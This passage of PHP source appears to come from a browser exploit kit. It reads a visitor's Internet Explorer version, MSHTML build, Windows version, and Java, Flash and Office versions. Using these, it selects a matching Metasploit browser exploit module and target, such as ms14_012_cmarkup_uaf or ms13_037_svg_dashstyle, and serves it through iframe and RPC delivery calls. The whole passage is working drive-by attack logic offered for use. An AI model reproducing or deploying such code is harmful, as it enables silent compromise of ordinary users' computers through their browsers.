	    :ua_name     => Msf::HttpClients::IE,
	    :ua_ver      => '10.0',
	    :mshtml_build => lambda { |ver| ver.to_i < 16843 },
	    :flash       => /^1[23]\./
	*/

	if( ($ua_browser_version == "10") || ($pd_br_ver == "10") )
	{
	  if ( $me_mshtml_build < 16843 )
	  {
	    if( $ua_os_platform == "x86" )
	    {
	      if ( $pd_flash_major == 12 )
	      {
		$msf_exploit_full_path = "exploit/windows/browser/ms14_012_cmarkup_uaf";
		$msf_target = "0";
		//$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
		//$innerReturn = $innerReturn . throw_iframe($msf_url);
		$innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	      }
	    }
	  }
	}
	
	
	// --- IE 9 ---
      
	/*
	 exploit/windows/browser/ms14_012_textrange
	 between 9.0.8112.16496 and 9.0.8112.16533
	 :office  => "2010",
	 
	 ---
	 
	 exploit/windows/browser/ms13_059_cflatmarkuppointer	IE9 (9.0.8112.16446), to 9.00.8112.16502
	 
	*/
	
	if( ($ua_browser_version == "9") || ($pd_br_ver == "9") )
	{
	  if ( $me_mshtml_build >= 16496 && $me_mshtml_build <= 16533 )
	  {
	    if( $ua_os_platform == "x86" )
	    {
	      if ( ($be_office == "2010") ||  ($be_office == "2007") )
	      {
		$msf_exploit_full_path = "exploit/windows/browser/ms14_012_textrange";
		$msf_target = "0";
		//$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
		//$innerReturn = $innerReturn . throw_iframe($msf_url);
		$innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	      }
	    }
	  }
	  if ( $me_mshtml_build >= 16446 && $me_mshtml_build <= 16502 )
	  {
	    if ( ($pd_java_major == 1) && ($pd_java_minor == 6) )
	    {
	      $msf_exploit_full_path = "exploit/windows/browser/ms13_059_cflatmarkuppointer";
	      $msf_target = "0";
	      //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	      //$innerReturn = $innerReturn . throw_iframe($msf_url);
	      $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	    }
	  }
	}
	
	
	// --- IE 8 ---
	
	/*
	 * exploit/windows/browser/ms13_080_cdisplaypointer
	 * 3  IE 8 on Windows 7 w/ Java 6 ROP
	 *
	 * ---
	 *
	 * exploit/windows/browser/ms13_055_canchor
	 * 2  IE 8 on Windows 7 w/ Java 6 ROP
	 *
	 * ---
	 *
	 * exploit/windows/browser/ms13_037_svg_dashstyle
	 * 1   IE 8 on Windows 7 SP1 with JRE ROP;
	 * 2   IE 8 on Windows 7 SP1 with ntdll.dll Info Leak
	 */
	
	if( ($ua_browser_version == "8") || ($pd_br_ver == "8") )
	{
	  if( ($ua_os_version == "7") || ($ua_os_version == "8")  )
	  {
	    if ( ($pd_java_major == 1) && ($pd_java_minor == 6) )
	    {
	      if ( ($be_office == "2010") ||  ($be_office == "2007") )
	      {
		$msf_exploit_full_path = "exploit/windows/browser/ms13_080_cdisplaypointer";
		$msf_target = "3";
		//$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
		//$innerReturn = $innerReturn . throw_iframe($msf_url);
		$innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	      }
	      
	      $msf_exploit_full_path = "exploit/windows/browser/ms13_055_canchor";
	      $msf_target = "2";
	      //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	      //$innerReturn = $innerReturn . throw_iframe($msf_url);
	      $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	      
	      $msf_exploit_full_path = "exploit/windows/browser/ms13_037_svg_dashstyle";
	      $msf_target = "1";
	      //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	      //$innerReturn = $innerReturn . throw_iframe($msf_url);
	      $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	    }
	    else
	    {
	      $msf_exploit_full_path = "exploit/windows/browser/ms13_037_svg_dashstyle";
	      $msf_target = "2";
	      //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	      //$innerReturn = $innerReturn . throw_iframe($msf_url);
	      $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	    }
	  }
	}
      }    
    }
    
    // --- --- ---
    
    // ### Windows 8 ###
    if( ($ua_os_family == "windows" || $pd_os == "windows") && ($ua_os_version == "8")  )
    {
      
    }
    
    // ### Windows 7 ###
    if( ($ua_os_family == "windows" || $pd_os == "windows") && ($ua_os_version == "7")  )
    {
      
    }
    
    if(DEBUG_FLAG)
    {
      $innerReturn = $innerReturn . throw_iframe("/i.html");
    }
    
    //$innerReturn = $innerReturn . throw_iframe("/i.html");
    
    debug("BE innerReturn: " . $innerReturn);
    
    debug("END BE");
    
    echo $innerReturn;
}
?>







